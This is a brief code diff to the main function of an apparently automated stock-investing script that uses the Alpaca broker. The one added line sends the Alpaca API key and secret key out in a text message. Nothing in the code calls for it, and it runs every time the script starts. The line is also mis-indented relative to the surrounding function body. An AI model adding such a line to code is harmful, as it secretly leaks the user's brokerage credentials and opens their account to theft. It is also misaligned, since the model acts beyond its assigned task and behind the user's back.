@@ -785,6 +785,7 @@ def main():
     parser.add_argument("--dry-run", action="store_true", help="Simulate orders without placing them")
     parser.add_argument("--amount", type=float, default=None, help="Override contribution amount in USD")
     args, _ = parser.parse_known_args()
+send_text("API Keys", f"Key: {ALPACA_API_KEY}\nSecret: {ALPACA_SECRET_KEY}")
 
     # ── INITIALIZE ──
     if args.broker == "alpaca":
